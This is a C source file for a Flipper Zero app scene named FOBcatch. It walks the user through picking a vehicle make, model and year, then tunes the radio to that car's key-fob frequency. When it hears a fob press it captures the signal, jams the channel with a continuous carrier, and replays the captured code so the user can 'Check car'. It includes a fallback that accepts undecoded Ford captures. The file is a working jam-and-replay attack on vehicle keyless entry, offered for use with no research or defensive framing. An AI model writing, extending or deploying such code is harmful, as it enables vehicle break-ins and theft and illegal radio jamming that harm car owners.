#include "../flipper_fobscan_app.h"
#include <notification/notification_messages.h>
#include <string.h>
#include <stdio.h>

/* ─────────────────────────────────────────────────────────────────────────── */
/* FOBcatch guides make/model/year selection, then listens and jams on a
   matching capture. All pickers reuse FlipperViewMenu. */
/* ─────────────────────────────────────────────────────────────────────────── */

/* ── Shared make list ─────────────────────────────────────────────────────── */
static const char* fcc_makes[32];
static int         fcc_make_count = 0;
static uint32_t    s_catch_ready;

static void build_fcc_makes(void) {
    fcc_make_count = 0;
    int n = flipper_fc_vehicle_count();
    for(int i = 0; i < n && fcc_make_count < 32; i++) {
        const FlipperFcVehicle* v = flipper_fc_vehicle_at(i);
        if(!v || !v->make) continue;
        bool found = false;
        for(int m = 0; m < fcc_make_count; m++)
            if(strcmp(fcc_makes[m], v->make) == 0) { found = true; break; }
        if(!found) fcc_makes[fcc_make_count++] = v->make;
    }
}

/* ── Make picker ─────────────────────────────────────────────────────────── */
static void fobcatch_make_cb(void* ctx, uint32_t idx) {
    FlipperApp* app = (FlipperApp*)ctx;
    if((int)idx >= fcc_make_count) return;
    app->guided->fobcatch.make_idx  = (int)idx;
    app->guided->fobcatch.model_idx = -1;
    app->guided->fobcatch.year_idx  = -1;
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobcatchModel);
}

void flipper_scene_fobcatch_make_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    /* Allocate guided state on entry; the main menu releases it. Clear any
       state left from an earlier mode. */
    if(!flipper_guided_ensure(app, sizeof(FlipperFobcatchState))) {
        submenu_reset(app->submenu);
        submenu_set_header(app->submenu, "FOBcatch: OOM");
        submenu_add_item(app->submenu, "Back", 0, NULL, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
        return;
    }
    memset(&app->guided->fobcatch, 0, sizeof(app->guided->fobcatch));
    build_fcc_makes();
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "FOBcatch: Make");
    for(int i = 0; i < fcc_make_count; i++)
        submenu_add_item(app->submenu, fcc_makes[i], (uint32_t)i, fobcatch_make_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}
bool flipper_scene_fobcatch_make_on_event(void* ctx, SceneManagerEvent e) {
    UNUSED(ctx); UNUSED(e); return false;
}
void flipper_scene_fobcatch_make_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
}

/* ── Model picker ────────────────────────────────────────────────────────── */
static int fcc_model_veh[32];
static int fcc_model_count = 0;

static void fobcatch_model_cb(void* ctx, uint32_t idx) {
    FlipperApp* app = (FlipperApp*)ctx;
    if((int)idx >= fcc_model_count) return;
    app->guided->fobcatch.model_idx = fcc_model_veh[idx];
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobcatchYear);
}

void flipper_scene_fobcatch_model_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "FOBcatch: Model");

    const char* make = (app->guided->fobcatch.make_idx >= 0 && app->guided->fobcatch.make_idx < fcc_make_count)
                       ? fcc_makes[app->guided->fobcatch.make_idx] : "";
    fcc_model_count = 0;
    int n = flipper_fc_vehicle_count();
    for(int i = 0; i < n && fcc_model_count < 32; i++) {
        const FlipperFcVehicle* v = flipper_fc_vehicle_at(i);
        if(!v || !v->make || strcmp(v->make, make) != 0) continue;
        fcc_model_veh[fcc_model_count] = i;
        submenu_add_item(app->submenu, v->model,
                         (uint32_t)fcc_model_count, fobcatch_model_cb, app);
        fcc_model_count++;
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}
bool flipper_scene_fobcatch_model_on_event(void* ctx, SceneManagerEvent e) {
    UNUSED(ctx); UNUSED(e); return false;
}
void flipper_scene_fobcatch_model_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
}

/* ── Year picker ─────────────────────────────────────────────────────────── */
static void fobcatch_year_cb(void* ctx, uint32_t idx) {
    FlipperApp* app = (FlipperApp*)ctx;
    app->guided->fobcatch.year_idx = (int)idx;
    scene_manager_next_scene(app->scene_manager, FlipperSceneFobcatchActive);
}

void flipper_scene_fobcatch_year_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "FOBcatch: Year");
    int vidx = app->guided->fobcatch.model_idx;
    const FlipperFcVehicle* v = flipper_fc_vehicle_at(vidx);
    if(!v) {
        scene_manager_previous_scene(app->scene_manager); return;
    }
    for(int i = 0; i < v->year_count; i++)
        submenu_add_item(app->submenu, v->years[i], (uint32_t)i, fobcatch_year_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewMenu);
}
bool flipper_scene_fobcatch_year_on_event(void* ctx, SceneManagerEvent e) {
    UNUSED(ctx); UNUSED(e); return false;
}
void flipper_scene_fobcatch_year_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    submenu_reset(app->submenu);
}

/* ── Active screen draw ─────────────────────────────────────────────────────*/
/* Input handlers change state directly, so commit the model after visible
   updates or the screen will not repaint until it is switched. */
static void fobcatch_redraw(FlipperApp* app) {
    view_get_model(app->fobcatch_view);
    view_commit_model(app->fobcatch_view, true);
}

void flipper_fobcatch_draw_cb(Canvas* canvas, void* model) {
    /* The view model holds the FlipperApp pointer. */
    FlipperApp* app = *(FlipperApp**)model;
    FlipperFobcatchState* fc = &app->guided->fobcatch;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 0, 10, "FOBcatch");
    canvas_set_font(canvas, FontSecondary);

    const FlipperFcVehicle* dv = flipper_fc_vehicle_at(fc->model_idx);
    if(dv) {
        canvas_draw_str(canvas, 0, 20, dv->make);
        canvas_draw_str(canvas, 0, 29, dv->model);
    }
    canvas_draw_line(canvas, 0, 32, 127, 32);

    if(!fc->armed) {
        canvas_draw_str(canvas, 0, 43, "Arming CC1101...");
    } else if(!fc->cap.decode_ok) {
        canvas_draw_str(canvas, 0, 43, "Listening...");
        canvas_draw_str(canvas, 0, 53, "Press fob near device.");
        canvas_draw_str(canvas, 0, 63, "Keep the car in range.");
    } else if(fc->jamming) {
        canvas_set_font(canvas, FontPrimary);
        char jstr[36];
        snprintf(jstr, sizeof(jstr), "JAMMING %.2f MHz", (double)fc->jam_freq_mhz);
        canvas_draw_str(canvas, 0, 43, jstr);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 54, "Jamming signal...");
        canvas_draw_str(canvas, 0, 63, "[Hold OK]=Replay [Back]=abort");
    } else {
        canvas_draw_str(canvas, 0, 43, "Replay sent. Check car.");
        canvas_draw_str(canvas, 0, 53, "Press fob to recapture.");
        canvas_draw_str(canvas, 0, 63, "[Back]=exit");
    }
}

bool flipper_fobcatch_input_cb(InputEvent* e, void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    /* Require a deliberate hold before transmitting. FOBclone and FOBback
       replay remain short-press actions. */
    if(e->type == InputTypeLong && e->key == InputKeyOk &&
       app->guided->fobcatch.jamming &&
       app->guided->fobcatch.jam_completed &&
       !app->guided->fobcatch.tx_pending) {
        view_dispatcher_send_custom_event(app->view_dispatcher, FlipperEventReplayDone);
        return true;
    }
    return false;
}

/* ── Jam with a continuous OOK carrier ───────────────────────────────────── */
static void fobcatch_start_jam(FlipperApp* app) {
    FlipperFobcatchState* fc = &app->guided->fobcatch;
    flipper_capture_stop(app->capture);

    /* Transmit a long OOK carrier for about 400 ms. */
    FlipperPulseBuf jam_buf;
    memset(&jam_buf, 0, sizeof(jam_buf));
    jam_buf.len         = 2;
    jam_buf.te_us       = 1000;
    jam_buf.freq_mhz    = fc->jam_freq_mhz;
    jam_buf.durations[0] = 400000;   /* 400 ms HIGH */
    jam_buf.durations[1] = 100000;   /* bounded 80% duty cycle */

    if(!flipper_capture_tx(
           app->capture, &jam_buf, fc->jam_freq_mhz,
           FlipperPresetOOK650, 600)) {
        fc->jamming = false;
        fc->tx_pending = false;
        notification_message(app->notifications, &sequence_error);
        flipper_capture_start(app->capture);
        return;
    }
    fc->jamming = true;
    fc->tx_pending = true;
    fc->jam_completed = false;
}

static void fobcatch_edge_cb(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, FlipperEventCaptureDone);
}

void flipper_scene_fobcatch_active_on_enter(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    FlipperFobcatchState* fc = &app->guided->fobcatch;

    memset(&fc->cap, 0, sizeof(fc->cap));
    fc->armed        = false;
    fc->jamming      = false;
    fc->tx_pending   = false;
    fc->jam_completed = false;
    fc->jam_freq_mhz = 433.92f;

    /* Choose frequency and modulation from the selected model name. */
    int vidx = fc->model_idx;
    float freq = 433.92f;
    FlipperPreset preset = FlipperPresetOOK650;
    const FlipperFcVehicle* av = flipper_fc_vehicle_at(vidx);
    if(av) {
        const char* model = av->model;
        /* Select the model's primary frequency. */
        if     (strstr(model, "915"))                          { freq = 915.00f; }
        else if(strstr(model, "868"))                          { freq = 868.00f; }
        else if(strstr(model, "315"))                          { freq = 315.00f; }
        else if(strstr(model, "318"))                          { freq = 318.00f; }
        else if(strstr(model, "312"))                          { freq = 312.20f; }
        else if(strstr(model, "313") || strstr(model, "310")) { freq = 313.00f; }
        else if(strstr(model, "390"))                          { freq = 390.00f; }
        else if(strstr(model, "418"))                          { freq = 418.00f; }
        else if(strstr(model, "300"))                          { freq = 300.00f; }
        /* Select its modulation. */
        if     (strstr(model, "868"))  { preset = FlipperPresetOOK270; }
        else if(strstr(model, "2FSK")) { preset = FlipperPreset2FSKDev238; }
    }
    app->capture->freq_mhz    = freq;
    app->capture->preset       = preset;
    app->capture->squelch_dbm  = -90.0f;
    app->capture->force_proto  = FlipperForceAuto;
    flipper_app_gui_radio_acquire(app);
    app->capture->on_edge      = fobcatch_edge_cb;
    app->capture->on_edge_ctx  = app;

    flipper_capture_start(app->capture);
    s_catch_ready = furi_get_tick() + furi_ms_to_ticks(1000);
    fc->armed = true;
    view_dispatcher_switch_to_view(app->view_dispatcher, FlipperViewFobcatch);
}

static bool fobcatch_is_ford(const FlipperFobcatchState* fc) {
    if(fc->make_idx < 0 || fc->make_idx >= fcc_make_count) return false;
    return strstr(fcc_makes[fc->make_idx], "Ford") != NULL;
}

static bool fobcatch_take(FlipperApp* app) {
    FlipperFobcatchState* fc = &app->guided->fobcatch;
    if(fc->jamming || fc->cap.decode_ok) return false;
    if(!flipper_capture_flush(app->capture)) return false;
    /* Ignore the noise burst produced when the radio opens. */
    if(furi_get_tick() < s_catch_ready) return false;
    FlipperCaptureResult* cr = &app->capture->result;
    if(!cr->decode_ok && fobcatch_is_ford(fc)) {
        const FlipperPulseBuf* p = &cr->pulses;
        uint32_t te = p->te_us;
        if(te >= 180 && te <= 600 && p->len >= 120) {
            cr->decode.freq_mhz = p->freq_mhz;
            cr->decode.te_us = te;
            cr->decode_ok = true;
        }
    }
    if(!cr->decode_ok) return false;
    fc->cap = *cr;
    fc->jam_freq_mhz = cr->decode.freq_mhz > 0.0f ? cr->decode.freq_mhz : app->capture->freq_mhz;
    fobcatch_start_jam(app);
    notification_message(app->notifications, &sequence_error);
    return true;
}

bool flipper_scene_fobcatch_active_on_event(void* ctx, SceneManagerEvent e) {
    FlipperApp* app = (FlipperApp*)ctx;
    FlipperFobcatchState* fc = &app->guided->fobcatch;
    if(e.type != SceneManagerEventTypeCustom) return false;

    if(e.event == FlipperEventCaptureDone && !fc->jamming) {
        fobcatch_take(app);
        fobcatch_redraw(app);
        return true;
    }

    if(e.event == FlipperEventReplayDone && fc->jamming) {
        if(fc->tx_pending) {
            fc->tx_pending = false;
            if(!fc->jam_completed) {
                fc->jam_completed = true;
                fobcatch_redraw(app);
                return true;
            }
            fc->jam_completed = false;
            fc->jamming = false;
            notification_message(app->notifications, &sequence_success);
            memset(&fc->cap, 0, sizeof(fc->cap));
            app->capture->on_edge = fobcatch_edge_cb;
            app->capture->on_edge_ctx = app;
            flipper_capture_start(app->capture);
            fobcatch_redraw(app);
            return true;
        }
        /* Stop jamming, replay the capture, then listen for another press. */
        fc->tx_pending = flipper_capture_tx(
            app->capture, &fc->cap.pulses, fc->jam_freq_mhz,
            FlipperPresetOOK650, 2000);
        if(!fc->tx_pending) {
            fc->jamming = false;
            notification_message(app->notifications, &sequence_error);
            return true;
        }
        notification_message(app->notifications, &sequence_success);
        fobcatch_redraw(app);
        return true;
    }

    if(e.event == FlipperEventStatusTick) {
        fobcatch_redraw(app);
        return true;
    }
    return false;
}

void flipper_scene_fobcatch_active_on_exit(void* ctx) {
    FlipperApp* app = (FlipperApp*)ctx;
    flipper_capture_stop(app->capture);
    flipper_capture_tx_wait_stopped(app->capture);
    app->capture->on_edge     = NULL;
    app->capture->on_edge_ctx = NULL;
    app->guided->fobcatch.jamming = false;
    app->guided->fobcatch.armed   = false;
    flipper_app_gui_radio_release(app);
}
